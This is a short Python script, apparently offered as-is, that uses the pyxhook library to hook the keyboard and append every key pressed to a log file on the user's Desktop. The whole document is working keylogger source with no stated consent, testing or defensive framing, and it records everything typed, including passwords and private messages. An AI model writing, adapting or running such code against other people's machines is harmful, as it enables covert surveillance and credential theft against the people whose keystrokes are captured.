import os
import pyxhook

# Set the log file path
log_file = os.path.expanduser('~/Desktop/file.log')

# Function to handle key press events
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

# Create a hook manager
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()

try:
    new_hook.start()  # Start the hook
except KeyboardInterrupt:
    pass
except Exception as ex:
    with open(log_file, 'a') as f:
        f.write('\nError while catching events:\n{}'.format(ex))